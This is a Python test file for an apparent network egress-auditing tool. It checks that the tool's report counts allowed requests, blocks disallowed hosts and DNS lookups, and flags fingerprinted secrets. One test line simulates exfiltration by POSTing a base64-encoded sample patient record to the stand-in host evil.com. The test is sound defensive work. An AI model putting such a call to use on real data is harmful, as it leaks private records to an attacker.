import base64

from poi.fingerprint import FingerprintSet
from poi.ledger import pubkey_hex
from poi.policy import parse
from poi.report import build_report, render_text
from poi.verify import verify_chain

from helpers import ENGINE_IMAGE, ENGINE_MOUNTS, POLICY, FakeFS, make_engine

SECRET = b"patient: Jan Kowalski, PESEL 85010112345, diagnosis: J45.0 asthma"


def test_report(tmp_path, key):
    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS))
    eng.genesis()
    for _ in range(3):
        gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
    gate.on_request("evil.com", "POST", "/drop", [], b"x=" + base64.b64encode(SECRET))
    gate.wal.record_dns("2026-10-13T18:00:00Z", "a.evil.com", "A", "block")
    eng.tick()
    fp = FingerprintSet(b"k" * 32)
    fp.add(SECRET, "patients/1.txt")
    res = verify_chain(tmp_path / "run", pubkey_hex(key))
    r = build_report(res, tmp_path / "run", parse(POLICY), fp)
    assert r["allowed_requests"] == 3
    assert r["capacity_bits_upper_bound"] == 27
    assert r["blocked_by_reason"] == {"host-not-allowed": 1, "dns": 1}
    assert r["fingerprint_hits"] == [{"seq": 4, "verdict": "block", "sources": ["patients/1.txt"]}]
    assert r["fingerprint_hits_in_allowed_traffic"] == 0
    text = render_text(r)
    assert "27 bits" in text and "hits in ALLOWED traffic: 0" in text
